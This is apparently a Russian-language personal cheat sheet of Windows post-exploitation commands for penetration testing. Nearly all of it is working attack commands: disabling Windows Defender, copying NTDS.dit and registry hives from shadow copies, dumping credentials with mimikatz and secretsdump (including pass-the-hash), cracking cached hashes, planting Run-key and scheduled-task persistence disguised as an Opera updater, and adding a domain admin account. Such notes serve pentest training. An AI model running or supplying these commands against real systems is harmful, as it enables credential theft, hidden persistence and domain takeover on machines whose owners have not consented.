# Up_windows


# Подсказки для виндовс

# https://github.com/davidbombal/Ethical-Hacking/blob/main/Windows%20Pentesting%20with%20OffSec

https://sushant747.gitbooks.io/total-oscp-guide/content/basics_of_windows.html

# Отключить Дефендер

sc stop windefend

sc query windefend

sc queryex type= service - все процессы

# Просмотр брандмауэра

netsh advfirewall firewall

netsh firewall show state

netsh firewall show config

# Создание теневой копии диска

vssadmin create shadow /for=c:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy


Поиск секретов


cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs


МИМИКАТЗ
мимикатз в метасплойт 

kiwi_cmd lsadump::sam


-----Распарсить SAM

python secretsdump.py -sam sam -system system LOCAL 

impacket-secretsdump hacker.local/user:password@ip_adress


-----Распарсить NTDS.DIT

impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text  

Распарсить на лету зная только хеш

impacket-secretsdump Administrator@192.168.50.200 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71

----- Получить 10 последних пользователей

Нужен system и security

reg save hklm\system c:\system 

reg save hklm\security c:\security

Подробнее: https://www.securitylab.ru/analytics/517178.php

и пытаемся крякнуть мскеш2

john --format=mscash2 --wordlist=/usr/share/wordlists/rockyou.txt filehash



Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим... (если уже админ то ситем)

Имперсонификация
PsExec64.exe -i -s cmd
PsExec64.exe -i -u "nt authority\local service" cmd

для psexec
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f




Автозагрузка.....
Если у вас права обычного пользователя, следует использовать ветку реестра HKCU

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
 
reg add "HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"



Если у вас есть админские права в системе, следует использовать ветку HKLM — в таком случае каждый раз при запуске системы будет выполняться payload.exe или dll. Этот способ хорош тем, что не зависит от пользователя, который логинится в систему.

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v payload /t REG_SZ /d "C:\tmp\payload.dll"
 
reg add “HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run” /v payload /t REG_SZ /d “C:\tmp\payload.exe”


Пример создания запланированной задачи:

schtasks /create /sc minute /mo 5 /tn "Opera scheduled Autoupdate 1594994248" /tr C:\tmp\Opera_autoupdate1594994248.exe

at 13:01 /interactive cmd запуск с правами администратора!!!

chcp 65001

psexec -i \\\adress -u user cmd

python smbexec.py ignite/administrator:Ignite@987@192.168.1.105

***************************************************************************************************************************************************
Cбор информации в домене 

net use * \\ta-d.local\NETLOGON - подключить сетевой диск

net accounts - парольная политика пользователя

net user /domain пользователи домена
Get-ADUser -identity administrator -properties *
Get-ADUser -identity administrator -properties memberof

net user administrator /domain в какие группы входит пользователь
net group "domain admins" кто входит в группы

Get-ADcomputer -filter * -properties * | ft nmae, ipv4adress компутеры в домене
net group "domain computer"
Systeminfo - отображает подробную информацию о конфигурации компьютера и его операционной системы.

wmic qfe  - перечислить патчи

wmic logicaldisk - перечислить диски


# Добавление пользователя в домен и в группу

net user mighty Password123! /add /domain
net group "domain admins" mighty /add /domain

# Enumeration running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}

# Service binary enumeration
icacls "C:\xampp\apache\bin\httpd.exe"
icalcs "C:\xampp\mysql\bin\mysqld.exe"

# Enumerate specific service
Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object StartMode

# Скрипты векторов повышения привелегий

cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config *.vbs

findstr /s /p /i /n /m "password" \\ta-d.local\SYSVOL\*.xml *.ini *.txt *.config *.vbs




Но перед этим нужно скачать exploit_suggester, например такой: GitHub - AonCyberLabs/Windows-Exploit-Suggester: This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.

Загрузка скриптов без получения разрешения на запуск POwerShell
IEX (New-Object Net.WebClient).DownloadString("file://$PWD/pw.ps1")

https://github.com/HarmJ0y/PowerUp

!!! http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar

Проверка мисконфигов виндовс

!!! https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
  для которого import-module ./powerup.ps1 и затем Invoke-AllChecks или 
  Invoke-AllChecks | out-file -Encoding ASCII checks.txt

  
